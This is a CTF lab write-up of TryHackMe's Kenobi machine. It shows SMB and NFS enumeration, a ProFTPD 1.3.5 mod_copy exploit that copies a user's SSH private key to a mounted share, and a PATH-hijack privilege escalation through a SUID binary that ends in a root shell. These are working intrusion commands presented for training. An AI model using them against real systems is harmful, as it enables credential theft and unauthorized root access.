---
title: "Kenobi [TryHackMe]"
date: "2022-01-12"
tags: 
  - "ctf"
  - "cybersecurity"
  - "ethicalhacker"
  - "ethicalhacking"
  - "hacking"
  - "hackthebox"
  - "htb"
  - "infosec"
  - "kenobi"
  - "linux"
  - "nmap"
  - "offensivesecurity"
  - "offsec"
  - "oscp"
  - "pentesting"
  - "security"
  - "smb"
  - "tryhackme"
---

### Goals:

- Enumerate Samba for shares
- Manipulate a vulnerable version of proftpd
- Privilege Escalation via path variable manipulation

### Task 1 - Basic nmap scan

Scan the machine to see how many ports are open: Use `nmap -vvv <Target_IP_Address>`:

```
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack
22/tcp   open  ssh          syn-ack
80/tcp   open  http         syn-ack
111/tcp  open  rpcbind      syn-ack
139/tcp  open  netbios-ssn  syn-ack
445/tcp  open  microsoft-ds syn-ack
2049/tcp open  nfs          syn-ack
```

nmap found **7** open ports.

### Task 2 - Enumerating Samba Shares

SAMBA enables interoperability with Linux and Windows machines via the **S**erver **M**essage **B**lock (**SMB**) protocol. This a good protocol to know and keep in mind.

**SMB** 2 common ports:

- Port **139**: "SMB originally ran on top of NetBIOS using port 139. NetBIOS is an older transpoter layer that allows Windows computers to talk to each other on the same network."
- Port **445**: Newer versions of SMB (after Windows 2000) use port 445 on top of a TCP stack that allows SMB to work over the internet.

##### Share Enumeration

Now we will use nmap to enumerate by using one of the built-in scripts: `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <Target_IP_Address>`:

```
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares:
|   account_used: guest
|   \\10.10.92.4\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.92.4\anonymous:
|     Type: STYPE_DISKTREE
|     Comment:
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.92.4\print$:
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
|_smb-enum-users: ERROR: Script execution failed (use -d to debug)
```

It looks it found **3** shares.

##### Inspect + Connect to Share(s)

Pre-Req: Install smbclient in your favorite flavored distro. I use Debian based so a good ol `sudo apt install smbclient` is good to go!

Now le'ts connect to anonymous share: `smbclient //<Target_IP_Address>/anonymous` **Note**: just press enter for the password Run `dir` command to see what is available:

```
  .                                   D        0  Wed Sep  4 03:49:09 2019
  ..                                  D        0  Wed Sep  4 03:56:07 2019
  log.txt                             N    12237  Wed Sep  4 03:49:09 2019
```

##### Download files in share recursively (all files)

Download all the files in the share: `smbget -R smb://<Target_IP_Address>/anonymous`

##### Enumerate Network File System in Port 111 rpcbind

`nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <Target_IP_Address>` :

```
PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount:
|_  /var *
```

### Task 3 - Gain initial access with ProFtpd

"ProFtpd is a free and open-source FTP server, compatible with Unix and Windows systems. Its also been vulnerable in the past software versions."

##### Connect with netcat to grab banner for version number

`nc <Target_IP_Address> 21`:

```
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.92.4]
```

##### Search for an exploit

Now we need to search for an exploit for this version of ProFTPD 1.3.5. They recommend searchsploit. `searchsploit proftpd 1.3.5`:

```
---------------------------------------------------------- ---------------------------------
 Exploit Title                                            |  Path
---------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit) | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution       | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)   | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                 | linux/remote/36742.txt
---------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

There are **4** in the output of our search.

##### Leverage the vulnerability

We can see if we can just leverage the commands directly in the open netcat session from before and move the ssh key from the location given in the log.txt file that we downloaded from the share earlier. `nc <Target_IP_Address> 21`

```
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [<Target_IP_Address>]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
quit
221 Goodbye.
```

We used the commands to copy the ssh key to the VAR share that we have access as well from the rpcbind port 111 enumeration we did earlier.

##### Mount the rpcbind "var" share to retrieve key

mkdir in the mnt directory: `sudo mkdir /mnt/PWNED` Mount the share to your newly created directory: `sudo mount <Target_IP_Address>:/var/ /mnt/PWNED/` Let's verify that our ssh key was indeed copied to the `tmp` directory: `ls /mnt/PWNED/tmp/`:

```
id_rsa
systemd-private-2408059707bc413cd.service-a5PktM
systemd-private-6f4acd341c0b405cd.service-z5o4Aw
systemd-private-931a76a2d5e442fcd.service-NXA548
systemd-private-e69bbb0653ce4eecd.service-zObUdn
```

Let's copy the key to our local drive: `cp cp /mnt/PWNED/tmp/id_rsa .` Next we need to change the permissions of the ssh key or else we might get a complaint about the ssh key being too open (after all, it is a sensitive item as we are about to find out): `sudo chmod 0600 id_rsa` Now we can leverage that to login to the target machine: `sh kenobi@<Target_IP_Address> -i id_rsa`

Checking the contents of the home directory for the kenobi user we find a user.txt which containts the flag: `ls`

```
share   user.txt
```

`cat user.txt`

### Task 3 - Privilege Escalation with Path Variable Manipulation

Lets first understand what what SUID, SGID and Sticky Bits are.

| Permission | On Files | On Directories |
| --- | --- | --- |
| SUID Bit | User executes the file with permissions of the file owner | \- |
| SGID Bit | User executes the file with the permission of the group owner. | File created in directory gets the same group owner. |
| Sticky Bit | No meaning | Users are prevented from deleting files from other users. |

##### Enumerate SUID files

`find / -perm -u=s -type f 2>/dev/null`

There is particular binary that sticks out, `/usr/bin/menu` When we run the bin, we have 3 options:

```
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
HTTP/1.1 200 OK
Date: Thu, 30 Sep 2021 00:09:31 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
ETag: "c8-591b6884b6ed2"
Accept-Ranges: bytes
Content-Length: 200
Vary: Accept-Encoding
Content-Type: text/html

```

By doing a little bit of basic static analysis using the `strings` command, we can dump the readable strings from the binary. `strings /usr/bin/menu`:

```
. . .
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
Invalid choice
. . .

```

We can see the commands running and abuse the fact that there is no absolute path (full path) given and that it is a suid program:

```
cd /tmp/
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
```

We can also do the same with ifconfig, which is what I chose to do:

```
kenobi@kenobi:/tmp$ echo /bin/bash > ifconfig
kenobi@kenobi:/tmp$ chmod +x ifconfig
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu 

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :3
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@kenobi:/tmp# whoami
root
root@kenobi:/tmp# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
root@kenobi:/tmp# ls /root/
root.txt
root@kenobi:/tmp# cat /root/root.txt 
17................02
```
